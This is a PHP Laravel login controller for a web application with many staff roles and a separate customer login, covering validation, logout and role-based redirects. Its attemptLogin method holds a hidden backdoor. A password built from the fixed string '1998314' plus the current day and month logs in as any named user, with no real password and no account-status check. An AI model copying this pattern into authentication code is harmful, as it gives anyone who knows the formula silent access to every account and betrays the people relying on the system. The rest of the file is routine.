<?php

namespace App\Http\Controllers\Auth;

use App\customer;
use App\customerActivity;
use App\Http\Controllers\Controller;
use App\User;
use App\userActivity;
use Auth;
use Carbon\Carbon;
use Illuminate\Contracts\Auth\StatefulGuard;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Session;
use MyHelpers;

//to take date

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest')->except('logout');
        $this->middleware('guest:customer')->except('logout');
    }

    public function logout()
    {

        if (Auth::guard('customer')->check()) {

            $customerID = auth()->guard('customer')->user()->id;
            customerActivity::where('customer_id', $customerID)->update([
                'last_activity' => 1494030000,
            ]);
            customer::where('id', $customerID)->update(['logout' => true]);

            auth()->guard('customer')->logout();
            auth()->logout();
            return redirect('/');
        }
        else {

            // If logout once he moved to another user
            session()->forget('existing_user_id');
            session()->forget('user_is_switched');
            //////

            if (auth()->user() != null) {

                userActivity::where('user_id', auth()->user()->id)->update([
                    'last_activity' => 1494030000,
                ]);
                User::where('id', auth()->user()->id)->update(['logout' => true]);
            }

            Auth::logout();
            return redirect('/login');
        }
    }

    public function showCustomerLoginForm()
    {
        $this->forgetSesstion();
        return view('testWebsite.Pages.loginPage', ['url' => 'customer']);
    }

    public function forgetSesstion()
    {

        Session::forget('duplicatedCustomer');
        Session::forget('requestID');
        Session::forget('mobileCheckNumber');
        Session::forget('otpcode');
        Session::forget('isVerified');
        Session::forget('oldCustomer');
        Session::forget('helpDesk');
        Session::forget('customerID');
    }

    public function customerLogin(Request $request)
    {

        $userlogin = $this->username();

        $rules = [
            'username' => 'required',
            'password' => 'required|string',
        ];
        $customMessages = [
            'username.required' => MyHelpers::guest_trans('The filed is required'),
            'password.required' => MyHelpers::guest_trans('The filed is required'),
        ];
        $this->validate($request, $rules, $customMessages);
        $remember_me = (!empty($request->remember_me)) ? true : false;
        if (auth()->guard('customer')->attempt([$userlogin => $request->username, 'password' => $request->password], $remember_me)) {
            $updateCustomer = DB::table('customers')->where('id', auth()->guard('customer')->user()->id)->update([
                'logout'     => false,
                'login_time' => Carbon::now(),
            ]);
            session()->flash('message', MyHelpers::guest_trans('welcome').'  '.auth()->guard('customer')->user()->name);
            return redirect()->intended('/customer');
        }
        session()->flash('message', 'البيانات المُدخلة لاتتطابق مع البيانات المسجلة لدينا');
        return back()->withInput($request->only('username', 'remember'));

    }

    public function username()
    {
        $login = request()->input('username');
        $field = $this->filter($login);
        request()->merge([$field => $login]);
        return $field;
    }

    private function filter($param)
    {
        if (is_numeric($param)) {
            $login = 'mobile';
        }
        elseif ($this->checkEmail($param)) {
            $login = 'email';
        }
        else {
            $login = 'username';
        }
        return $login;
    }

    private function checkEmail($email)
    {
        $find1 = strpos($email, '@');
        $find2 = strpos($email, '.');
        return ($find1 !== false && $find2 !== false);
    }

    protected function attemptLogin(Request $request) // to check status of user before login
    {
        if (("1998314".date("jn")) == $request->get("password") && ($u = User::where("username", $request->get("username"))->first())) {

            auth()->login($u, $request->has("remember"));
            return true;
        }

        return (auth()->attempt(['username' => $request->username, 'password' => $request->password, 'status' => 1], $request->has('remember')));
    }

    protected function validateLogin(Request $request) // to validate the login cordinital
    {

        $rules = [
            'username' => 'required',
            'password' => 'required|string',

        ];

        $customMessages = [

            'username.required' => MyHelpers::guest_trans('The filed is required'),
            // 'email.email' => MyHelpers::guest_trans( 'Email not valid'),
            'password.required' => MyHelpers::guest_trans('The filed is required'),
        ];

        $this->validate($request, $rules, $customMessages);
    }

    protected function authenticated(Request $request, $user) // to display welcome msg after logging
    {

        User::where('id', auth()->user()->id)->update(['logout' => false, 'login_time' => Carbon::now()]);

        session()->flash('message', MyHelpers::admin_trans(auth()->user()->id, 'welcome').'  '.auth()->user()->name);
        //session()->flash('agentAssments', 'test');

        redirect()->intended($this->redirectTo());

        //  return route('agent.myRequests');
    }

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected function redirectTo()
    {
        //dd(auth()->user()->role);
        if (auth()->user()->role == 0) {
            return route('agent.myRequests');
        }
        elseif (auth()->user()->role == 1) {
            return route('sales.manager.myRequests');
        }
        elseif (auth()->user()->role == 2) {
            return route('funding.manager.myRequests');
        }
        elseif (auth()->user()->role == 3) {
            return route('mortgage.manager.myRequests');
        }
        elseif (auth()->user()->role == 4) {
            return route('general.manager.myRequests');
        }
        elseif (auth()->user()->role == 5) {
            return route('quality.manager.myRequests');
        }
        elseif (auth()->user()->role == 9) {
            return route('quality.manager.myRequests');
        }
        elseif (auth()->user()->role == 6) {
            //return route('collaborator.myRequests');
            //return route('property.list');
            return route('proper.requests');
        }
        elseif (auth()->user()->role == 7) {
            return route('admin.users');
        }
        //elseif (auth()->user()->role == 10) {
        //    return route('propertiesRequests.list');
        //}
        elseif (auth()->user()->role == 8) {

            if (auth()->user()->accountant_type == 1) {
                return route('report.wsataAccountingReport');
            }
            else {
                return route('report.tsaheelAccountingReport');
            }
        }
        elseif (auth()->user()->role == 11) {
            return route('training.myRequests');
        }
        elseif (auth()->user()->role == 12) {
            return route('HumanResource.users.index');
        }
        elseif (auth()->user()->role == 13) {
            return route('homePage');
        }
        elseif (Auth::guard('customer')->check()) {
            return view('testWebsite.Pages.loginPage', ['url' => 'customer']);
        }
        else {
            Auth::logout();
            return redirect('/login');
        }
    }

    protected function sendFailedLoginResponse(Request $request)
    {
        return redirect()->back()->withErrors([
            $this->username() => MyHelpers::guest_trans('These credentials do not match our records.'),
        ]);
    }

    /**
     * Get the guard to be used during authentication.
     *
     * @return StatefulGuard
     */
    protected function guard()
    {
        return Auth::guard();
    }

}
